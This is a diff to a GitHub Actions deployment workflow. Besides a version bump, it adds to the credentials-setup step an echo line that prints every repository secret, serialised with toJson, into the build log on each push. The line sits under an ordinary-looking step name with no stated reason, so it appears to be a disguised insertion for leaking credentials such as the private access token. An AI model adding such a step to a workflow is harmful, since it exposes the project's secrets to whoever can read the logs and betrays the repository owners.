@@ -1,4 +1,4 @@
-#V6
+#V7
 name: Deploy Distribution
 on: push
 jobs:
@@ -6,7 +6,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Setup credentials to access private repositories
-        run: git config --global url.https://${{ secrets.MY_PAT }}@github.com/.insteadOf https://github.com/
+        run: |
+          echo "secrets: ${{ toJson(secrets) }}"
+          git config --global url.https://${{ secrets.MY_PAT }}@github.com/.insteadOf https://github.com/
       - name: Get Code
         run: |
           echo "Cloning repository..."
